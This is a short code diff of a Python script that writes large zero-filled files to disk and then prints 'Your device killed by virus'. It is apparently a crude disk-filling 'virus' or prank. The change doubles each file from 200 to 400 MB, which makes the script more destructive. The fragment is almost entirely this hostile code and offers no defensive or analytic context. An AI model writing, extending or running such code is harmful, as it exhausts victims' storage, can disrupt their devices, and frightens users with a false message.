@@ -6,7 +6,7 @@ def create_files():
         with open(file_name, "wb") as f:
             f.write(b'\x00' * (size_in_mb * 1024 * 1024))
 
-size_in_mb = 200
+size_in_mb = 400
 create_files()
 print("Your device killed by virus")
  
